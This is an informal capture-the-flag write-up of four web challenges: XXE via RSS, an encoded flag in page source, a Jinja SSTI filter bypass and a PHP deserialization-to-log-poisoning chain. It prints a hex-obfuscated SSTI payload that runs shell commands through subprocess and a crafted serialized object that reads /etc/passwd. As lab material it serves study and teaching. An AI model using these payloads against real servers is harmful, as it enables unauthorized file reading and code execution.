# Web

## Xaml-Fasa [50pts]

`A friend of Rafiki... RSS is the magic Word. The flag is located at /opt/flag.txt`

So this is the chall that we got.
First of all the description talk about rss so directly with think about xxe vuln so let try it
First i test a basic xxe injection not to exploit but just to detect

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITYexample "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

![First attempt](img/burp1.png)

We got nothing but the description say rss so let try a real rss flux

```xml
<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>My Example Blog</title>
    <link>https://www.example.com/blog/</link>
    <description>The latest updates from My Example Blog.</description>
    <language>en-us</language>
    <lastBuildDate>Fri, 08 Nov 2025 20:46:00 +0000</lastBuildDate>
    <generator>Custom RSS Generator</generator>
    <item>
      <title>Second Blog Post</title>
      <link>https://www.example.com/blog/second-post/</link>
      <description>This is the content of my second blog post.</description>
      <pubDate>Wed, 06 Nov 2025 15:30:00 +0000</pubDate>
      <guid isPermaLink="true">https://www.example.com/blog/second-post/</guid>
    </item>

  </channel>
</rss>
```

We can see the result
![Second request with a valid rss format](img/burp2.png)
alright now let inject our payload i think the server display only  the link tag so let see if it's right
![Payload injected](img/burp3.png)

Nice final step let's  try to get the flag

for the moment just check if we can read system file
![System file readed](img/burp4.png)

Very nice and then the flag
![Flag](img/flag1.png)

### Xaml-Fasa Pwned

## Forbiden [100pts]

There are no description for this chall

So let explore

![He he](img/for1.png)
just scrolling text but we can not see the source code of the page i think all click and shortcut key are disabled

In my head:`What? that is all!??`

![shoked](img/sup.gif)

We can just use curl bro

![The source code](img/for2.png)

An encoded text.Please come in rescue  [CyberChef](https://gchq.github.io/CyberChef/)

![The flag](img/for3.png)

### Forbiden Pwned

## Samurai [150pts]

`I guess i'm awesome i developed this using my Samurai-coding skills...`

this is the website

![The page](img/sam1.png)

I directly think to XSS(Cross-Site Scripting) and  SSTI(Server Side Template Injection); but just SSTI can give us code execution so i focus on it directly
In our burp we notice that the app is build with python: `Server: Werkzeug/1.0.1 Python/2.7.18` so
First test : `{{ 7*7 }}`

![Fact](img/sam2.png)

He he he

![he he](img/pisica-cat.gif)

Alright let exploit this vuln to get our flag

Generally the purpose is to open a file named `flag.txt` on the system i think,  so in python when we talk about reading file we can call `os.open` there let try to import the os and read the flag

![alert](img/red-alert.gif)

![Oups](img/sam3.png)

It was obvious. There are some filter there so the text to enter can't contains these keywords/characters:
`'config', '_' , 'RUNCMD', 'os' or 'base'`

What that mean any payload like :

```python
{{ ''.__class__.__mro__[2].__subclasses__() }}

{{ self.__init__.__globals__.__builtins__ }}

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

may not work! So what solution can we have there
maybe encoding any characters, or use modules that do the same thing

first let do an recon
![begin](img/sam4.png)

![and](img/sam5.png)

A few moment later I got this who can help me to get my flag

```python
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['eval']("\x5f\x5fim" "port\x5f\x5f('subprocess').check\x5foutput('cat flag.txt', shell=True)") }}
```

I use `request['application']['__globals__']` to get the top of the code where i can find  `__builtins__` and use it to get `eval` and execute shell code with `subprocess` and the result we get our flag
![flag](img/sam6.png)

### Samurai Pwned

## Fatal [500pts]

![Page](img/fat1.png)

Very nice story but first i explore the source  code there are no link for anything and then let's check in the side of burp

Got something here
![fact](img/fat2.png)
this cookie seem like the patern of php serialized objects

![serialized patern](img/dese.png)

alright let's check it in [CyberChef](https://gchq.github.io/CyberChef/)

![good find](img/fat3.png)

It look like it's the web page that is loaded let try to load `/etc/passwd` file to see what happen
![poisoned](img/fat4.png)

notice that we modify the last s value also because it need to macth with the number of characters of the contains of the `""`!

Note: there are `s` because the content is a strings!
So  
  `/etc/passwd` is 11 characters so we place `O:11:"ArcaneModel":1:{s:10:"armageddon";s:11:"/etc/passwd";}`

let encode and send it to see the result:

![boom](img/fat5.png)

Very nice we can read abritary file with this alright let's get our flag

![no flag](img/fat6.png)

Why??
May be the name is not correct i search anywhere nothing for me and for the moment i take a break and come back
We known that we have an LFI (Local File Inclusion) but how can we get an RCE (Remote Code execution) to find how flag??

Some googling...

Here a good ressources for Web Security [PayloadAllThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)

![good ressources](img/fat7.png)

I check everyone the one who is possible is by log file

![access log file](img/fat9.png)

- We know that the server is nginx
- We know that nginx log are  located in `/var/log/nginx/`
- And we can access to the `access.log` file
  
Nice so what to do now
let make  our malicious request to the server

![payload](img/fat8.png)

and then
![executed](img/fat10.png)

boom!!!

We know now that we can execute code in the log file just by replacing our User-Agent with malicious php code so let find our flag and read it

After searching i find the flag there
![Getting flag](img/fat11.png)
![Flag](img/fat12.png)

###  Fatal pwned
